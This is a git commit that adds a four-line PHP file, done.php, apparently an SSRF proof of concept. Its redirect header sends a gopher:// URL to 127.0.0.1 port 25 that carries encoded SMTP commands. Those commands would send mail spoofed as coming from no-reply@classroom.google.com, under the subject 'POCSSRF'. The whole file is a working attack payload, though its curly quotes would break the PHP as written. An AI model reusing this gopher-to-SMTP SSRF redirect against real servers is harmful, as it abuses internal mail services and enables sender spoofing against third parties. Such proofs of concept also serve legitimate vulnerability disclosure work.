f227771f01cc8571df24e283c9f38429aa1c8927
Sanidhya Ved <sanidhyaved@gmail.com>
2022-06-16 00:16:29 +0530

    Add files via upload

---
+++ done.php
@@ -0,0 +1,4 @@
+<?php
+header(‘location: gopher://127.0.0.1:25/_MAIL%20FROM:no-reply%40classroom.google.com%0ARCPT%20To:sanidhyaved%40gmail.com%0ADATA%0AFrom:no-reply%40classroom.google.com%0ASubject:POCSSRF%0AMessage:done%0A.
+’);
+?>
